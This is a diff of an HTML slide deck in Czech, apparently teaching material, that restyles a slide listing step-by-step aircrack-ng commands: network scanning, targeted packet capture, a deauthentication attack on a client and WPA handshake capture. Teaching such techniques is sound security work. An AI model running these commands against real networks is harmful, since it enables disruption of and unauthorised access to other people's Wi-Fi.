@@ -12,38 +12,42 @@
     <style>
       .cmd-table {
         width: 100%;
-        font-size: 0.58em;
+        font-size: 0.44em;
+        line-height: 1.25;
         border-collapse: collapse;
         text-align: left;
-        margin-top: 1rem;
+        margin-top: 0.4rem;
       }
       .cmd-table th {
         background-color: #007acc;
         color: white;
-        padding: 0.6rem;
+        padding: 0.35rem 0.5rem;
+        font-size: 1.1em;
       }
       .cmd-table td {
-        padding: 0.6rem;
-        border-bottom: 1px solid #ddd;
-        vertical-align: top;
+        padding: 0.3rem 0.5rem;
+        border-bottom: 1px solid #e0e0e0;
+        vertical-align: middle;
       }
       .cmd-code {
         font-family: monospace;
         background-color: #1e1e1e;
         color: #dcdcdc;
-        padding: 0.4rem 0.6rem;
+        padding: 0.25rem 0.45rem;
         border-radius: 4px;
         white-space: pre-wrap;
         word-break: break-all;
-        font-size: 1.1em;
+        font-size: 1.15em;
+        line-height: 1.2;
       }
       .step-badge {
         background: #f6821f;
         color: white;
         font-weight: bold;
-        padding: 0.2rem 0.5rem;
+        padding: 0.15rem 0.4rem;
         border-radius: 4px;
         white-space: nowrap;
+        font-size: 1.1em;
       }
     </style>
   </head>
@@ -52,16 +56,16 @@
       <div class="slides">
 
         <!-- Slide 1: Kompletní přehled na jednom slajdu -->
-        <section>
-          <h2>Wi-Fi Hacking: Všechny příkazy krok za krokem</h2>
-          <p style="font-size: 0.75em; color: #666; margin-bottom: 0.5rem;">Kartu máte již v <strong>Monitor módu</strong> (<code>wlan0mon</code>)</p>
+        <section style="padding: 0;">
+          <h3 style="font-size: 1.15em; margin-bottom: 0.2rem;">Wi-Fi Hacking: Příkazy krok za krokem</h3>
+          <p style="font-size: 0.65em; color: #666; margin-bottom: 0.3rem;">Kartu máte již v <strong>Monitor módu</strong> (<code>wlan0mon</code>)</p>
           
           <table class="cmd-table">
             <thead>
               <tr>
                 <th style="width: 12%;">Krok</th>
-                <th style="width: 48%;">Příkaz (Command)</th>
-                <th style="width: 40%;">Popis &amp; Cíl</th>
+                <th style="width: 53%;">Příkaz (Command)</th>
+                <th style="width: 35%;">Popis &amp; Cíl</th>
               </tr>
             </thead>
             <tbody>
@@ -73,22 +77,22 @@
               <tr>
                 <td><span class="step-badge">Krok 2</span></td>
                 <td><div class="cmd-code">sudo airodump-ng wlan0mon</div></td>
-                <td>Skenování všech sítí v okolí. Poznamenej si <strong>BSSID</strong> a <strong>CH</strong> sítě.</td>
+                <td>Skenování sítí. Poznamenej si <strong>BSSID</strong> a <strong>CH</strong>.</td>
               </tr>
               <tr>
                 <td><span class="step-badge">Krok 3</span></td>
                 <td><div class="cmd-code">sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; -w pokus wlan0mon</div></td>
-                <td>Zacílení na síť a ukládání paketů do <code>pokus-01.cap</code>. Nech běžet! Poznamenej si MAC klienta.</td>
+                <td>Zacílení a ukládání do <code>pokus-01.cap</code>. Nech běžet! Poznamenej MAC klienta.</td>
               </tr>
               <tr>
                 <td><span class="step-badge">Krok 4</span></td>
                 <td><div class="cmd-code">sudo aireplay-ng --deauth 5 -a &lt;BSSID&gt; -c &lt;MAC_KLIENTA&gt; wlan0mon</div></td>
-                <td><em>(V novém okně)</em> Odeslání deautentizace pro opakováné přihlášení klienta.</td>
+                <td><em>(V novém okně)</em> Deautentizace pro opakováné přihlášení.</td>
               </tr>
               <tr>
                 <td><span class="step-badge">Krok 5</span></td>
                 <td><div class="cmd-code"># Kontrola v 1. okně: [ WPA handshake: BSSID ]</div></td>
-                <td>Ověř zachycení handshaku vpravo nahoře a stiskni <code>Ctrl + C</code> pro ukončení skenu.</td>
+                <td>Ověř zachycení a stiskni <code>Ctrl + C</code> pro ukončení.</td>
               </tr>
               <tr>
                 <td><span class="step-badge">Krok 6</span></td>
